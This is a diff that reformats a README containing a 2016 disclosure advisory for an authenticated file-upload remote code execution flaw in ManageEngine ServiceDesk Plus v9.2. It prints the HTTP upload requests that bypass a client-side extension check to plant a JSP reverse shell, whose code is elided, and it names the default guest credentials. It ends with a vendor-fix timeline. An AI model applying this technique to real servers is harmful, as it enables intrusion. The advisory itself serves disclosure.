@@ -1,15 +1,25 @@
 # manageeningefileupload
 
-# Exploit Title: Authenticated Remote Code Execution via File Upload Vulnerability in ManageEngine ServiceDesk Plus (Authenticated)
-# Date: 14-Nov-2016
-# Discovered by Omer Alper Karakus (omeralperkarakus[at]gmail.com), Abdullah Sinan Sekerci (lpthread999[at]gmail.com), Anil Aytac (4nl[at]aytac.email), Asli Koksal (koksal.a[at]gmail.com), STM
-# Affected Product: ManageEngine ServiceDesk Plus
-# Tested on: v9.2 build number 9232
 
+Exploit Title: Authenticated Remote Code Execution via File Upload Vulnerability in ManageEngine ServiceDesk Plus (Authenticated)
+
+
+Date: 14-Nov-2016
+
+
+Discovered by Omer Alper Karakus (omeralperkarakus[at]gmail.com), Abdullah Sinan Sekerci (lpthread999[at]gmail.com), Anil Aytac (4nl[at]aytac.email), Asli Koksal (koksal.a[at]gmail.com), STM
+
+
+Affected Product: ManageEngine ServiceDesk Plus
+
+
+Tested on: v9.2 build number 9232
+
+<pre>
 File upload vulnerability can only be exploited by an authenticated user which can also be any low privileged user like guest (default account: u:guest/p:guest)
 This vulnerability can be exploited by uploading a JSP file instead of image file. Since the file extension has been checked on the client side, it is possible to upload a jsp file which contains a reverse shell by intercepting the request and changing the file extension from .jsp.jpg to .jsp.
-
-
+</pre>
+<pre>
 REQUEST:
 ===========================================================================================
 POST /jsp/UploadImage.jsp HTTP/1.1
@@ -29,7 +39,7 @@ Content-Length: 1902
 Content-Disposition: form-data; name="img_file"; filename="shell.jsp.jpg"
 Content-Type: image/jpeg
 
-<...JSP reverse shell code...>
+{...JSP reverse shell code...}
 
 -----------------------------229512600118535
 Content-Disposition: form-data; name="zereqid"
@@ -40,8 +50,9 @@ Content-Disposition: form-data; name="Module"
 
 WorkOrder
 -----------------------------229512600118535--
+</pre>
 
-
+<pre>
 EDITED REQUEST:
 ===========================================================================================
 POST /jsp/UploadImage.jsp HTTP/1.1
@@ -61,7 +72,7 @@ Content-Length: 1902
 Content-Disposition: form-data; name="img_file"; filename="shell.jsp"
 Content-Type: image/jpeg
 
-<...JSP reverse shell code...>
+{...JSP reverse shell code...}
 
 -----------------------------229512600118535
 Content-Disposition: form-data; name="zereqid"
@@ -72,8 +83,8 @@ Content-Disposition: form-data; name="Module"
 
 WorkOrder
 -----------------------------229512600118535--
-
-
+</pre>
+<pre>
 After a succesful request, the response shows us the location of our reverse shell file:
 RESPONSE
 ===========================================================================================
@@ -93,12 +104,13 @@ Server: -
   		//alert("/inline/"+"WorkOrder"+"/"+"4"+"/"+"1479198475119.jsp");
   		parent.ZE.activeEditor.previewImage("/inline/"+"WorkOrder"+"/"+"4"+"/"+"1479198475119.jsp");//No i18n
 		</script>
+</pre>		
 		
-		
-
+<pre>
 Timeline
 ======
  
 15-Nov-2016 – Notification to Vendor
 18-Nov-2016 – Response from Vendor
 01-Dec-2016 - Issue has been fixed by vendor https://www.manageengine.com/products/service-desk/readme-9.2.html
+</pre>
